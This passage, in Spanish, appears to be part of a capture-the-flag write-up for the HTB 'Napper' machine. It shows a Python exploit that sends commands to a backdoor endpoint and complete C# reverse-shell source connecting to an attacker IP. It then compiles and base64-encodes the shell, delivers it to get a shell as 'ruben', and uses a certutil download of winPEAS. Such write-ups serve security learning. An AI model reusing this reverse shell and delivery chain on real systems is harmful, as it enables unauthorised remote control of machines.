</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>command</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>100</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Making a request to </span><span class=si>{</span><span class=n>post_url</span><span class=si>!r}</span><span class=s2> with command </span><span class=si>{</span><span class=n>args</span><span class=o>.</span><span class=n>command</span><span class=si>!r}</span><span class=s2>...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Making a request to </span><span class=si>{</span><span class=n>post_url</span><span class=si>!r}</span><span class=s2> with provided command...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>post_url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>req_headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>post_data</span><span class=p>,</span> <span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>allow_redirects</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>!=</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[!] Status code </span><span class=si>{</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=si>!r}</span><span class=s2>...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[!] An error ocurred:</span><span class=se>\n</span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Command succesfully executed...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>()</span><span class=o>-&gt;</span><span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>args</span> <span class=o>=</span> <span class=n>parse_arguments</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=c1># By default, ignore all warnings (related to unsecure SSL connections)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>show_warnings</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>warnings</span><span class=o>.</span><span class=n>filterwarnings</span><span class=p>(</span><span class=s2>&#34;ignore&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>make_request</span><span class=p>(</span><span class=n>args</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></div><ul><li>Ahora, si pasamos un payload de tipo <code>Powershell (Base64)</code> desde la web de <code>Reverse Shell Generator</code> (<a href=https://www.revshells.com/ class=external-link target=_blank rel=noopener>https://www.revshells.com/</a>) al script no pasa nada.</li><li>Podemos intentar otro payload de la misma p√°gina, como <code>C# TCP Client</code>. Si visitamos el sitio, agregamos nuestra IP de atacantes, el puerto en que nos pondremos en escucha y el tipo de shell como <code>CMD</code> la p√°gina da un c√≥digo como:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-cs data-lang=cs><span class=line><span class=cl><span class=k>using</span> <span class=nn>System</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.Text</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.IO</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.Diagnostics</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.ComponentModel</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.Linq</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.Net</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.Net.Sockets</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nn>ConnectBack</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kd>public</span> <span class=k>class</span> <span class=nc>Program</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=kd>static</span> <span class=n>StreamWriter</span> <span class=n>streamWriter</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=kd>public</span> <span class=kd>static</span> <span class=k>void</span> <span class=n>Main</span><span class=p>(</span><span class=kt>string</span><span class=p>[]</span> <span class=n>args</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=n>using</span><span class=p>(</span><span class=n>TcpClient</span> <span class=n>client</span> <span class=p>=</span> <span class=k>new</span> <span class=n>TcpClient</span><span class=p>(</span><span class=s>&#34;10.10.16.6&#34;</span><span class=p>,</span> <span class=m>443</span><span class=p>))</span>
</span></span><span class=line><span class=cl>			<span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=n>using</span><span class=p>(</span><span class=n>Stream</span> <span class=n>stream</span> <span class=p>=</span> <span class=n>client</span><span class=p>.</span><span class=n>GetStream</span><span class=p>())</span>
</span></span><span class=line><span class=cl>				<span class=p>{</span>
</span></span><span class=line><span class=cl>					<span class=n>using</span><span class=p>(</span><span class=n>StreamReader</span> <span class=n>rdr</span> <span class=p>=</span> <span class=k>new</span> <span class=n>StreamReader</span><span class=p>(</span><span class=n>stream</span><span class=p>))</span>
</span></span><span class=line><span class=cl>					<span class=p>{</span>
</span></span><span class=line><span class=cl>						<span class=n>streamWriter</span> <span class=p>=</span> <span class=k>new</span> <span class=n>StreamWriter</span><span class=p>(</span><span class=n>stream</span><span class=p>);</span>
</span></span><span class=line><span class=cl>						
</span></span><span class=line><span class=cl>						<span class=n>StringBuilder</span> <span class=n>strInput</span> <span class=p>=</span> <span class=k>new</span> <span class=n>StringBuilder</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>						<span class=n>Process</span> <span class=n>p</span> <span class=p>=</span> <span class=k>new</span> <span class=n>Process</span><span class=p>();</span>
</span></span><span class=line><span class=cl>						<span class=n>p</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>FileName</span> <span class=p>=</span> <span class=s>&#34;cmd&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>						<span class=n>p</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>CreateNoWindow</span> <span class=p>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>						<span class=n>p</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>UseShellExecute</span> <span class=p>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>						<span class=n>p</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>RedirectStandardOutput</span> <span class=p>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>						<span class=n>p</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>RedirectStandardInput</span> <span class=p>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>						<span class=n>p</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>RedirectStandardError</span> <span class=p>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>						<span class=n>p</span><span class=p>.</span><span class=n>OutputDataReceived</span> <span class=p>+=</span> <span class=k>new</span> <span class=n>DataReceivedEventHandler</span><span class=p>(</span><span class=n>CmdOutputDataHandler</span><span class=p>);</span>
</span></span><span class=line><span class=cl>						<span class=n>p</span><span class=p>.</span><span class=n>Start</span><span class=p>();</span>
</span></span><span class=line><span class=cl>						<span class=n>p</span><span class=p>.</span><span class=n>BeginOutputReadLine</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>						<span class=k>while</span><span class=p>(</span><span class=kc>true</span><span class=p>)</span>
</span></span><span class=line><span class=cl>						<span class=p>{</span>
</span></span><span class=line><span class=cl>							<span class=n>strInput</span><span class=p>.</span><span class=n>Append</span><span class=p>(</span><span class=n>rdr</span><span class=p>.</span><span class=n>ReadLine</span><span class=p>());</span>
</span></span><span class=line><span class=cl>							<span class=c1>//strInput.Append(&#34;\n&#34;);</span>
</span></span><span class=line><span class=cl>							<span class=n>p</span><span class=p>.</span><span class=n>StandardInput</span><span class=p>.</span><span class=n>WriteLine</span><span class=p>(</span><span class=n>strInput</span><span class=p>);</span>
</span></span><span class=line><span class=cl>							<span class=n>strInput</span><span class=p>.</span><span class=n>Remove</span><span class=p>(</span><span class=m>0</span><span class=p>,</span> <span class=n>strInput</span><span class=p>.</span><span class=n>Length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>						<span class=p>}</span>
</span></span><span class=line><span class=cl>					<span class=p>}</span>
</span></span><span class=line><span class=cl>				<span class=p>}</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=kd>private</span> <span class=kd>static</span> <span class=k>void</span> <span class=n>CmdOutputDataHandler</span><span class=p>(</span><span class=kt>object</span> <span class=n>sendingProcess</span><span class=p>,</span> <span class=n>DataReceivedEventArgs</span> <span class=n>outLine</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>StringBuilder</span> <span class=n>strOutput</span> <span class=p>=</span> <span class=k>new</span> <span class=n>StringBuilder</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(!</span><span class=n>String</span><span class=p>.</span><span class=n>IsNullOrEmpty</span><span class=p>(</span><span class=n>outLine</span><span class=p>.</span><span class=n>Data</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>try</span>
</span></span><span class=line><span class=cl>                <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=n>strOutput</span><span class=p>.</span><span class=n>Append</span><span class=p>(</span><span class=n>outLine</span><span class=p>.</span><span class=n>Data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=n>streamWriter</span><span class=p>.</span><span class=n>WriteLine</span><span class=p>(</span><span class=n>strOutput</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=n>streamWriter</span><span class=p>.</span><span class=n>Flush</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=k>catch</span> <span class=p>(</span><span class=n>Exception</span> <span class=n>err</span><span class=p>)</span> <span class=p>{</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>donde <code>10.10.16.6</code> es mi IP de atacante y <code>443</code> es el puerto en el que me pondr√© en escucha con <code>netcat</code></p><ul><li>Como sea, este c√≥digo por s√≠ mismo no funciona. Tenemos que modificarlo agregando 2 cosas:</li></ul><ol><li>Tenemos que crear un <code>namespace</code> (un container usado en <code>C#</code> para organizar elementos del c√≥digo como clases, estructuras, interfaces, etc), donde el nombre de este <code>namespace</code> debe ser el mismo que el del archivo en s√≠. As√≠ que, por ejemplo, si llamamos a nuestro <code>namespace</code> como <code>payload</code>, entonces nuestro archivo debe de llamarse <code>payload.cs</code>.</li><li>Agregar una clase <code>Run</code> al c√≥digo.</li></ol><ul><li>Agregando estas dos modificaciones al c√≥digo del payload original, es que decido crear un nuevo archivo llamado <code>payload.cs</code> el cual contiene:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-cs data-lang=cs><span class=line><span class=cl><span class=k>using</span> <span class=nn>System</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.Text</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.IO</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.Diagnostics</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.ComponentModel</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.Linq</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.Net</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.Net.Sockets</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nn>payload</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kd>public</span> <span class=k>class</span> <span class=nc>Run</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=kd>static</span> <span class=n>StreamWriter</span> <span class=n>streamWriter</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=kd>public</span> <span class=n>Run</span><span class=p>()</span>
</span></span><span class=line><span class=cl>		<span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=n>using</span><span class=p>(</span><span class=n>TcpClient</span> <span class=n>client</span> <span class=p>=</span> <span class=k>new</span> <span class=n>TcpClient</span><span class=p>(</span><span class=s>&#34;10.10.16.6&#34;</span><span class=p>,</span> <span class=m>443</span><span class=p>))</span>
</span></span><span class=line><span class=cl>			<span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=n>using</span><span class=p>(</span><span class=n>Stream</span> <span class=n>stream</span> <span class=p>=</span> <span class=n>client</span><span class=p>.</span><span class=n>GetStream</span><span class=p>())</span>
</span></span><span class=line><span class=cl>				<span class=p>{</span>
</span></span><span class=line><span class=cl>					<span class=n>using</span><span class=p>(</span><span class=n>StreamReader</span> <span class=n>rdr</span> <span class=p>=</span> <span class=k>new</span> <span class=n>StreamReader</span><span class=p>(</span><span class=n>stream</span><span class=p>))</span>
</span></span><span class=line><span class=cl>					<span class=p>{</span>
</span></span><span class=line><span class=cl>						<span class=n>streamWriter</span> <span class=p>=</span> <span class=k>new</span> <span class=n>StreamWriter</span><span class=p>(</span><span class=n>stream</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>						<span class=n>StringBuilder</span> <span class=n>strInput</span> <span class=p>=</span> <span class=k>new</span> <span class=n>StringBuilder</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>						<span class=n>Process</span> <span class=n>p</span> <span class=p>=</span> <span class=k>new</span> <span class=n>Process</span><span class=p>();</span>
</span></span><span class=line><span class=cl>						<span class=n>p</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>FileName</span> <span class=p>=</span> <span class=s>&#34;cmd&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>						<span class=n>p</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>CreateNoWindow</span> <span class=p>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>						<span class=n>p</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>UseShellExecute</span> <span class=p>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>						<span class=n>p</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>RedirectStandardOutput</span> <span class=p>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>						<span class=n>p</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>RedirectStandardInput</span> <span class=p>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>						<span class=n>p</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>RedirectStandardError</span> <span class=p>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>						<span class=n>p</span><span class=p>.</span><span class=n>OutputDataReceived</span> <span class=p>+=</span> <span class=k>new</span> <span class=n>DataReceivedEventHandler</span><span class=p>(</span><span class=n>CmdOutputDataHandler</span><span class=p>);</span>
</span></span><span class=line><span class=cl>						<span class=n>p</span><span class=p>.</span><span class=n>Start</span><span class=p>();</span>
</span></span><span class=line><span class=cl>						<span class=n>p</span><span class=p>.</span><span class=n>BeginOutputReadLine</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>						<span class=k>while</span><span class=p>(</span><span class=kc>true</span><span class=p>)</span>
</span></span><span class=line><span class=cl>						<span class=p>{</span>
</span></span><span class=line><span class=cl>							<span class=n>strInput</span><span class=p>.</span><span class=n>Append</span><span class=p>(</span><span class=n>rdr</span><span class=p>.</span><span class=n>ReadLine</span><span class=p>());</span>
</span></span><span class=line><span class=cl>							<span class=n>p</span><span class=p>.</span><span class=n>StandardInput</span><span class=p>.</span><span class=n>WriteLine</span><span class=p>(</span><span class=n>strInput</span><span class=p>);</span>
</span></span><span class=line><span class=cl>							<span class=n>strInput</span><span class=p>.</span><span class=n>Remove</span><span class=p>(</span><span class=m>0</span><span class=p>,</span> <span class=n>strInput</span><span class=p>.</span><span class=n>Length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>						<span class=p>}</span>
</span></span><span class=line><span class=cl>					<span class=p>}</span>
</span></span><span class=line><span class=cl>				<span class=p>}</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=kd>public</span> <span class=kd>static</span> <span class=k>void</span> <span class=n>Main</span><span class=p>(</span><span class=kt>string</span><span class=p>[]</span> <span class=n>args</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=k>new</span> <span class=n>Run</span><span class=p>();</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=kd>private</span> <span class=kd>static</span> <span class=k>void</span> <span class=n>CmdOutputDataHandler</span><span class=p>(</span><span class=kt>object</span> <span class=n>sendingProcess</span><span class=p>,</span> <span class=n>DataReceivedEventArgs</span> <span class=n>outLine</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>StringBuilder</span> <span class=n>strOutput</span> <span class=p>=</span> <span class=k>new</span> <span class=n>StringBuilder</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(!</span><span class=n>String</span><span class=p>.</span><span class=n>IsNullOrEmpty</span><span class=p>(</span><span class=n>outLine</span><span class=p>.</span><span class=n>Data</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>try</span>
</span></span><span class=line><span class=cl>                <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=n>strOutput</span><span class=p>.</span><span class=n>Append</span><span class=p>(</span><span class=n>outLine</span><span class=p>.</span><span class=n>Data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=n>streamWriter</span><span class=p>.</span><span class=n>WriteLine</span><span class=p>(</span><span class=n>strOutput</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=n>streamWriter</span><span class=p>.</span><span class=n>Flush</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=k>catch</span> <span class=p>(</span><span class=n>Exception</span> <span class=n>err</span><span class=p>)</span> <span class=p>{</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><ul><li>Para compilar este c√≥digo en el archivo <code>.cs</code> en nuestra m√°quina de atacante necesitamos usar <code>Mono C# Compiler</code> (<code>MCS</code>). Para ello la instalamos corriendo:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo apt install mono-devel -y
</span></span></span></code></pre></div><ul><li>Luego, compilamos el archivo <code>payload.cs</code> corriendo:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ mcs -out:payload.exe payload.cs
</span></span></span></code></pre></div><ul><li>Ahora podemos pasar el binario de c√≥digo a texto. Dado que el par√°metro <code>sdafwe3rwe23</code> del endpoint endpoint detectado recibe data en <code>base64</code>, es que podemos pasar el binario a <code>base64</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ base64 -w0 payload.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAOAAAgELAQgAAAoAAAAGAAAAAAAAfigAAAAgAAAAQAAAAAB&lt;SNIP&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span></span></code></pre></div><ul><li>Finalmente, me pongo en escucha con <code>netcat</code> por el puerto <code>443</code> y paso el payload generado a la flag <code>--command</code> a mi script de <code>Python</code>, corriendo:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 naplistener_exploit.py -t https://napper.htb -c &#39;TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAOAAAgELAQgA&lt;SNIP&gt;AAAAAAAAAAAAA&#39;
</span></span></span></code></pre></div><p>y en mi listener de <code>netcat</code> obtengo una shell como el usuario <code>ruben</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap -cAr nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.240] 50716
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.19045.3636]
</span></span></span><span class=line><span class=cl><span class=go>(c) Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>C:\Windows\system32&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go>napper\ruben
</span></span></span></code></pre></div><p>donde podemos leer la flag de usuario en el directorio <code>C:\Users\ruben\Desktop\</code>.</p><h2 id=nt-authoritysystem---administratoradministrador>NT Authority/System - Administrator/Administrador
<a class=heading-link href=#nt-authoritysystem---administratoradministrador><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>Usando <code>systeminfo</code> muestra que:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Temp\www\internal\content\posts\internal-laps-alpha&gt;systeminfo | findstr &#34;System OS&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>OS Name:                   Microsoft Windows 10 Pro
</span></span></span><span class=line><span class=cl><span class=go>OS Version:                10.0.19045 N/A Build 19045
</span></span></span><span class=line><span class=cl><span class=go>OS Manufacturer:           Microsoft Corporation
</span></span></span><span class=line><span class=cl><span class=go>OS Configuration:          Standalone Workstation
</span></span></span><span class=line><span class=cl><span class=go>OS Build Type:             Multiprocessor Free
</span></span></span><span class=line><span class=cl><span class=go>System Boot Time:          4/26/2024, 2:40:20 PM
</span></span></span><span class=line><span class=cl><span class=go>System Manufacturer:       VMware, Inc.
</span></span></span><span class=line><span class=cl><span class=go>System Model:              VMware7,1
</span></span></span><span class=line><span class=cl><span class=go>System Type:               x64-based PC
</span></span></span><span class=line><span class=cl><span class=go>BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
</span></span></span><span class=line><span class=cl><span class=go>System Directory:          C:\Windows\system32
</span></span></span><span class=line><span class=cl><span class=go>System Locale:             en-us;English (United States)
</span></span></span></code></pre></div><p>de manera que estamos ante una m√°quina <code>Windows 10</code> de arquitectura <code>64-bits</code>.</p><ul><li>Para empezar a analizar la m√°quina, transfiero un binario de <code>Winpeas</code> a la m√°quina v√≠ctima. Para ello me descargo <code>winPEASx64.exe</code> desde <a href=https://github.com/peass-ng/PEASS-ng/releases/tag/20240421-825f642d class=external-link target=_blank rel=noopener>su repositorio oficial</a>. Una vez descargado, empiezo un server temporal <code>HTTP</code> con <code>Python</code> en el puerto <code>8081</code>, donde <code>WinPEAS</code> est√° localizado:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 -m http.server 8081
</span></span></span></code></pre></div><p>y en la m√°quina v√≠ctima uso la herramienta <code>certutil</code> (la cual viene incluida con <code>Windows</code>) para descargarlo y guardarlo en el directorio <code>C:\Users\Public\Downloads</code> para evadir problemas con permisos de escritura:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;certutil.exe -urlcache -split -f http://10.10.16.6:8081/winpeas.exe .\winpeas.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>****  Online  ****
</span></span></span><span class=line><span class=cl><span class=go>  000000  ...
</span></span></span><span class=line><span class=cl><span class=go>  246e00
</span></span></span></code></pre></div><ul><li>Una vez descargado lo corro:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;.\winpeas.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run &#39;REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1&#39; and then start a new CMD
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>File Permissions &#34;C:\Temp\www\internal\content\posts\internal-laps-alpha\a.exe&#34;: Authenticated Users [WriteData/CreateFiles]
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
